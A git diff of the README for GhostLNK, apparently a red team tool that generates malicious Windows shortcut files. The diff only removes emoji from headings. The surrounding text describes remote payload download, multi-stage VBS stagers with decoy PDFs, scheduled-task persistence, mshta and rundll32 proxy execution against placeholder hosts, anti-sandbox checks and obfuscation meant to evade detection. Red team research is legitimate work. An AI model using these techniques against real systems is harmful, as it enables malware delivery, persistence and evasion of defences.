@@ -17,7 +17,7 @@
 
 ---
 
-## 🧬 Overview
+## Overview
 
 **GhostLNK** is a professional‑grade Windows LNK (shortcut) generator that incorporates advanced tradecraft to help operators reduce detection surface. It supports multi‑stage execution, icon smuggling, LotL proxies, and anti‑sandbox checks, providing a flexible toolkit for red team operations and security research.
 
@@ -26,9 +26,9 @@
 
 ---
 
-## 🚀 Key Features
+## Key Features
 
-### 🧩 Payload Generation
+### Payload Generation
 | Mode | Description |
 |------|-------------|
 | **Download & Open** | Downloads a remote file to `%TEMP%` and opens it with the default application. |
@@ -36,7 +36,7 @@
 | **Ultra Stealth** | Minimal, obfuscated PowerShell commands to reduce signature exposure. |
 | **Raw Target** | Launches any executable directly, bypassing PowerShell completely. |
 
-### 🛡️ Advanced Techniques
+### Advanced Techniques
 | Technique | Description |
 |-----------|-------------|
 | **Multi‑Stage Stager** | LNK → drops VBS → opens decoy PDF → creates scheduled task → executes final payload. Fragments the attack chain into benign‑looking steps. |
@@ -48,14 +48,14 @@
 | **Anti‑Sandbox** | Checks for VM and analysis tool processes and terminates if detected. |
 | **XOR Encoding & String Obfuscation** | Encrypts payloads and breaks suspicious strings (`powershell` → `('po'+'wer'+'she'+'ll')`). |
 
-### 🎚️ Stealth Levels
+### Stealth Levels
 | Level | Behavior |
 |-------|----------|
 | **0 – Normal** | Standard PowerShell output, visible window. |
 | **1 – Moderate** | PowerShell aliases, minimized window (`-W 1`). |
 | **2 – Maximum** | Obfuscated code, minimal flags, no `-WindowStyle Hidden`. |
 
-### 🖥️ Professional Interface
+### Professional Interface
 - **Two‑Column Header** – Title and console output side‑by‑side.
 - **Neon Matrix Aesthetic** – High‑contrast, monospaced theme.
 - **Step‑by‑Step Workflow** – Numbered stages with visual progress indicators.
@@ -66,7 +66,7 @@
 
 ---
 
-## 📁 Project Structure (Modular)
+## Project Structure (Modular)
 
 GhostLNK has been refactored into a clean, maintainable structure:
 
@@ -92,7 +92,7 @@ GhostLNK/
 
 ---
 
-## 📦 Installation
+## Installation
 
 ### Prerequisites
 - **Python 3.8+**
@@ -110,23 +110,23 @@ GhostLNK automatically installs missing dependencies when launched if `pip` is a
 
 ---
 
-## 🧪 Usage Guide
+## Usage Guide
 
-### 🚀 Basic Workflow (PowerShell Payload)
+### Basic Workflow (PowerShell Payload)
 1. **Enter URL** – e.g., a Dropbox link with `&dl=1`.
 2. **Choose Payload Type** – Download & Open, Memory Execute, or Ultra Stealth.
 3. **Set Stealth Level** – 0 (normal) to 2 (maximum).
 4. **Execution Options** – Pause, debug, or hide window.
 5. **Generate** – Follow the numbered buttons: Show → Encode → Copy → Use.
 
-### 🎯 Raw Target Mode
+### Raw Target Mode
 Enable **Raw Target Mode** to launch any executable directly:
 ```
 Target: C:\Windows\System32\mshta.exe
 Args:   "https://example.com/payload.hta"
 ```
 
-### 🧬 Embedded Payload (No Network)
+### Embedded Payload (No Network)
 Paste a PowerShell script into the **Embedded Payload** area. Enable **XOR Encode** or **String Obfuscation** for extra stealth. Choose from several delivery methods:
 
 | Method | How It Works |
@@ -142,7 +142,7 @@ Paste a PowerShell script into the **Embedded Payload** area. Enable **XOR Encod
 3. Provide **Final Payload URL** (executed via scheduled task).
 The LNK drops a VBS script in a hidden folder, opens the decoy, and creates a persistent scheduled task with a random GUID name.
 
-### 🌐 LotL Proxies
+### LotL Proxies
 Select a proxy binary and provide the required URL/script:
 - **mshta.exe** → `http://server/payload.hta`
 - **rundll32.exe** → JavaScript payload
@@ -151,7 +151,7 @@ Select a proxy binary and provide the required URL/script:
 
 ---
 
-## 🧠 Design Philosophy
+## Design Philosophy
 
 GhostLNK incorporates techniques observed in modern attack chains to help reduce the likelihood of static and behavioral detection:
 - **Removing PowerShell from command lines** – Self‑Extracting and True Icon Smuggling methods rely on `cmd.exe`, `wscript.exe`, and benign targets.
@@ -169,7 +169,7 @@ The LNK file contains a hex‑encoded VBS script after the `GHOSTLNK_HEX:` marke
 
 ---
 
-## 📁 Configuration
+## Configuration
 
 ### `ghostlnk_config.json`
 ```json
@@ -189,7 +189,7 @@ ICON_DATABASE = {
 
 ---
 
-## 🧰 Troubleshooting
+## Troubleshooting
 
 | Symptom | Likely Fix |
 |---------|------------|
@@ -201,7 +201,7 @@ ICON_DATABASE = {
 
 ---
 
-## 📚 Educational Resources
+## Educational Resources
 
 - [Microsoft LNK Format](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/)
 - [MITRE ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)
@@ -209,7 +209,7 @@ ICON_DATABASE = {
 
 ---
 
-## ⚖️ Legal & Ethical Use
+## Legal & Ethical Use
 
 > [!CAUTION]
 > GhostLNK is **only** for:
@@ -222,7 +222,7 @@ ICON_DATABASE = {
 
 ---
 
-## 🤝 Contributing
+## Contributing
 
 1. Fork the repo
 2. Create a feature branch (`git checkout -b feature/amazing`)
@@ -232,7 +232,7 @@ ICON_DATABASE = {
 
 ---
 
-## 🙏 Acknowledgments
+## Acknowledgments
 
 - **pylnk3** for core LNK manipulation
 - The security research community for continuous inspiration
